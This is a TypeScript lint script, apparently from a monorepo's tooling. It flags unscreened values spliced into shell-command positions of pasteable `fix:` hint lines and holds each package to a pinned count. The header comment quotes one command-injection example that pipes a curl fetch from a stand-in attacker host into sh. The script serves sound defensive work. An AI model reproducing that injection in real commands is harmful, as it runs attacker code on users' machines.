#!/usr/bin/env bun
// Enforce, as a ratchet, that a value spliced into a `fix:` line never lands in a SHELL COMMAND
// POSITION unscreened. A `fix:` is a command meant to be pasted, so a `${…}` after a command word
// is a value that RUNS.
//
// THE DEFECT THIS EXISTS FOR, in `@ultimat3/core`'s own words: `x g route /$(curl -s
// http://evil.sh|sh)` was the rendered fix for an unauthenticated `GET` against any unrouted path.
// `renderFixShellArg` (`packages/core/src/error-render.ts:210`) was written to close that one site
// and nothing has been watching the other hundred-odd — a value reaches a `fix:` from a URL, a
// header, a database row or a file on disk, and `renderFixLiteral` beside it is explicitly NOT the
// answer: it answers `JSON.stringify`, and `$(…)`, a backtick and `${…}` are all live inside double
// quotes in every POSIX shell.
//
// WHAT IT READS: the ORIGINAL text between the start of the line and the `${`. The mask blanks a
// template's TEXT, and the text is the whole question — `x g route ` in front of a substitution is
// what makes it an argument. Two positions count: an argument to a COMMAND WORD opening the
// segment, and a substitution sitting directly after `|`, `||`, `&&`, `;` or `$(`, where the value
// is the command.
//
// WHAT IT NEVER REPORTS: a substitution wrapped in `renderFixShellArg` / `renderFixLiteral` /
// `shellInertIdentifier` / `quoteArg`; anything after a `#`, which opens a shell comment; and prose
// carrying a command word, recognised by an em dash, a comma or a `(` between the word and the
// substitution — `x verify, then read ${detail}` is a sentence, and a rule that reds every sentence
// is a rule an agent switches off.
//
// WHERE A FIX IS: a `fix:` key, a `const fix =`, and — the second pass, plan 101 row S12 — the
// argument of any factory declaring a parameter named `fix`, in whichever file calls it. The
// storage drivers handed `deleteFailed(…, fix)` an `aws s3api` command with a raw key in it and no
// `fix:` key was ever in sight. A `const` bound to a screening call is screened where it is spliced.
//
// WHAT IT CANNOT SEE: a `fix:` assembled by a helper that returns the string, a value laundered
// through a `const` bound to anything but a screening call, a sink whose parameter has another name,
// and a nested template inside a `${…}` — `maskLiterals` reads the inner backtick as the outer
// template's close, which `scripts/error-render.ts` already names as a gap belonging to
// `@ultimat3/cli`'s `ts-scan.ts`. A floor, not a proof.
//
//   bun run fix-shell-arg  ·  bun run scripts/fix-shell-arg.ts [--json] [--explain]
//   bun run scripts/fix-shell-arg.ts --unpin <pkg>[,<pkg>]   # shrink the ratchet

import type { SourceFile } from './boundaries';
// One tokenizer, never two: `maskToCode` keeps a template's `${…}` bodies as code while blanking
// every literal's text, and `valueEnd` answers where a `fix:` value ends. A second copy here would
// be a second answer to the same question, and the two would disagree the day either was tuned.
import { maskToCode, valueEnd } from './error-render';
import { corpus } from './lib/corpus';
import { FIX_SHELL_ARG_PINS, FIX_SHELL_PINS_FILE } from './lib/fix-shell-arg-pins';
import { commandPositionOf, isScreened } from './lib/fix-shell-arg-scan';
import type { FixParams } from './lib/fix-shell-arg-sinks';
import {
  fixSpans,
  NO_PARAMS,
  screenedConsts,
  fixParamsOf as sinkParamsOf,
} from './lib/fix-shell-arg-sinks';
import type { Finding } from './lib/log';
import type { PinTable, RatchetGap } from './lib/ratchet';
import { ratchetGaps, ratchetMain } from './lib/ratchet';
import type { SiteProbe } from './lib/ratchet-sites';
import { leadSite, newSitesFirst, siteList } from './lib/ratchet-sites';
import { isTestPath, lineOf } from './lib/source-scan';

const SCRIPT = 'fix-shell-arg';
const EXPLAIN = 'bun run scripts/fix-shell-arg.ts --explain --json lists every one';

/** Source the CLI EMITS rather than executes — a scaffolded app's own fix lines, not this tree's. */
const TEMPLATE_ROOT = 'packages/cli/src/templates/';

export interface FixShellArgSite {
  readonly path: string;
  readonly line: number;
  /** The substitution's own text, so the finding can quote it back. */
  readonly substitution: string;
  /** The command word it is an argument to, or `a shell operator`. */
  readonly command: string;
}

export type { FixParams } from './lib/fix-shell-arg-sinks';

/** The first pass, over raw sources: every exported factory taking a `fix`, and where it sits. */
export const fixParamsOf = (sources: readonly string[]): FixParams =>
  sinkParamsOf(
    valueEnd,
    sources.map((source) => maskToCode(source).code),
  );

/**
 * The source with every `${…}` BODY blanked to `_` — the opposite of the mask. A body is code, and
 * code read as template text lies: the `(` of an earlier `renderFixShellArg(` cut the segment, its
 * `,` read as prose, and a `#` in a placeholder read as a shell comment. Newlines stay, so a line
 * still opens where it did.
 */
function templateText(source: string, bodies: readonly { start: number; end: number }[]): string {
  const out = source.split('');
  for (const body of bodies) {
    for (let i = body.start; i < body.end; i += 1) if (out[i] !== '\n') out[i] = '_';
  }
  return out.join('');
}

/** Every unscreened substitution in a command position in one file, in source order. */
export function scanFixShellArgs(
  path: string,
  source: string,
  params: FixParams = NO_PARAMS,
): readonly FixShellArgSite[] {
  const mask = maskToCode(source);
  const text = templateText(source, mask.substitutions);
  const screened = screenedConsts(valueEnd, mask.code);
  const seen = new Set<number>();
  const sites: FixShellArgSite[] = [];
  for (const [start, end] of fixSpans(valueEnd, mask.code, params)) {
    for (const one of mask.substitutions) {
      if (one.start < start || one.end > end || seen.has(one.start)) continue;
      seen.add(one.start);
      const body = mask.code.slice(one.start, one.end);
      if (isScreened(body) || screened(body.trim(), one.start)) continue;
      // The template TEXT, not the mask: the mask has blanked the text that decides it.
      const opens = text.lastIndexOf('\n', one.start - 2) + 1;
      const command = commandPositionOf(text.slice(opens, one.start - 2));
      if (command === undefined) continue;
      sites.push({ path, line: lineOf(mask.code, one.start), substitution: body.trim(), command });
    }
  }
  return sites.sort((a, b) => a.line - b.line);
}

export type FixShellArgGap = RatchetGap<FixShellArgSite>;

export interface FixShellArgInput {
  readonly sites: readonly FixShellArgSite[];
  readonly pins: PinTable;
  /** False means the scan read nothing, which must never read as a clean tree. */
  readonly scanned: boolean;
}

/** The ratchet: a package may hold what it is pinned at, may fall, may never rise. */
export const checkFixShellArgs = (input: FixShellArgInput): readonly FixShellArgGap[] =>
  ratchetGaps(input.sites, input.pins, input.scanned);

const at = (site: FixShellArgSite | undefined): string =>
  site === undefined ? '' : `${site.path}:${String(site.line)}`;

/**
 * EVERY site, never only the first. The first site of a package is usually one its pin already
 * allows, and the site that took it over the pin is whichever was added last — which the tree
 * cannot say. Naming only the first sent a reader to `backfill-errors.ts:32` for a splice that had
 * just been written in `errors-concurrency.ts` (plan 101).
 */
const overFinding = (gap: FixShellArgGap): Finding => {
  const sites = gap.sites ?? (gap.first === undefined ? [] : [gap.first]);
  const listed = siteList(gap, (site) => `${at(site)} (\${${site.substitution}})`, EXPLAIN);
  const excess = gap.found - gap.pinned;
  const which =
    sites.length === 1
      ? `at ${at(gap.first)}`
      : `at ${String(excess)} of the ${String(sites.length)} sites the cause lists — the one this change added`;
  return {
    code: 'X_FIX_SHELL_ARG_UNSCREENED',
    cause: `${gap.pkg} splices ${String(gap.found)} value(s) into the command position of a fix: line and is pinned at ${String(gap.pinned)} — ${listed} — and a fix: is a command meant to be pasted, so a value carrying $(…), a backtick or a ; runs whatever it says`,
    fix: `wrap it: renderFixShellArg(value, '<what a reader substitutes>') from @ultimat3/core, ${which}; if the value cannot carry shell syntax, raise ${gap.pkg} in FIX_SHELL_ARG_PINS in ${FIX_SHELL_PINS_FILE} with the sentence saying where it comes from`,
    at: at(leadSite(gap)),
  };
};

const staleFinding = (gap: FixShellArgGap): Finding => ({
  code: 'X_FIX_SHELL_ARG_PIN_STALE',
  cause: `${gap.pkg} is pinned at ${String(gap.pinned)} unscreened fix: substitution(s) and has ${String(gap.found)} — the pin is above what this tree contains, so it would let ${String(gap.pinned - gap.found)} back in`,
  fix: `bun run scripts/fix-shell-arg.ts --unpin ${gap.pkg}`,
  at: FIX_SHELL_PINS_FILE,
});

const unexplainedFinding = (gap: FixShellArgGap): Finding => ({
  code: 'X_FIX_SHELL_ARG_PIN_UNEXPLAINED',
  cause: `${gap.pkg} is pinned with a blank reason, so nothing records where its ${String(gap.found)} spliced value(s) come from — a count with no sentence is the waiver axiom 3 refuses, and the pin holds nothing`,
  fix: `write where each remaining value in ${gap.pkg} comes from — a literal this process wrote, a name a schema parsed — in ${FIX_SHELL_PINS_FILE}; or wrap them in renderFixShellArg and run bun run scripts/fix-shell-arg.ts --unpin ${gap.pkg}`,
  at: FIX_SHELL_PINS_FILE,
});

const unscannedFinding = (): Finding => ({
  code: 'X_FIX_SHELL_ARG_UNSCANNED',
  cause:
    'no source file was read, so every package reports zero and the ratchet enforces nothing — a glob that matches nothing reads exactly like a tree with no spliced fix: value in it',
  fix: 'edit PATTERNS in scripts/lib/corpus.ts so it matches this repo layout, then bun run scripts/fix-shell-arg.ts',
  at: 'scripts/lib/corpus.ts',
});

/**
 * A `switch`, not the `Readonly<Record<Kind, …>>` table its twenty siblings use — deliberately, and
 * measured: `TABLE[gap.kind]` is a computed read of a `Record` object literal, which is exactly what
 * `bun run proto-index` refuses, and the two `scripts/` sites this file would have added were the
 * ones that took the package off its own ratchet. TypeScript's exhaustiveness gives the same build
 * error a ninth kind would get from the table, with no prototype to walk into.
 */
export const fixShellArgFindingFor = (gap: FixShellArgGap): Finding => {
  switch (gap.kind) {
    case 'over':
      return overFinding(gap);
    case 'stale':
      return staleFinding(gap);
    case 'unexplained':
      return unexplainedFinding(gap);
    case 'unscanned':
      return unscannedFinding();
  }
};

/** Shipped source, minus tests and minus the templates the CLI emits rather than runs. */
const shipped = (file: SourceFile): boolean =>
  !isTestPath(file.path) && !file.path.startsWith(TEMPLATE_ROOT);

/**
 * The sinks the last full scan found. Module state, deliberately: `SiteProbe.rescan` re-reads ONE
 * file at the base ref, and a sink declared in another file is only known from the corpus pass.
 * Rescanning without it would call every sink site "new since origin/main".
 */
let lastParams: FixParams = NO_PARAMS;

export const fixShellArgSites = async (root: string): Promise<readonly FixShellArgSite[]> => {
  const files = (await corpus(root, 'source')).filter(shipped);
  lastParams = fixParamsOf(files.map((file) => file.source));
  return files.flatMap((file) => scanFixShellArgs(file.path, file.source, lastParams));
};

const PROBE: SiteProbe<FixShellArgSite> = {
  rescan: (path, source) => scanFixShellArgs(path, source, lastParams),
  line: (site) => site.line,
};

export const fixShellArgGaps = async (root: string): Promise<readonly FixShellArgGap[]> =>
  newSitesFirst(
    root,
    checkFixShellArgs({
      sites: await fixShellArgSites(root),
      pins: FIX_SHELL_ARG_PINS,
      scanned: true,
    }),
    PROBE,
  );

/** What this rule contributes to `x verify`'s `errors` step, through `errorRendering`'s caller. */
export const fixShellArgFindings = async (root: string): Promise<readonly Finding[]> =>
  (await fixShellArgGaps(root)).map(fixShellArgFindingFor);

if (import.meta.main) {
  await ratchetMain({
    script: SCRIPT,
    pinsFile: FIX_SHELL_PINS_FILE,
    pins: FIX_SHELL_ARG_PINS,
    sites: fixShellArgSites,
    findingFor: fixShellArgFindingFor,
    probe: PROBE,
    clean: 'every fix: substitution in a shell command position is at or under its package pin',
  });
}
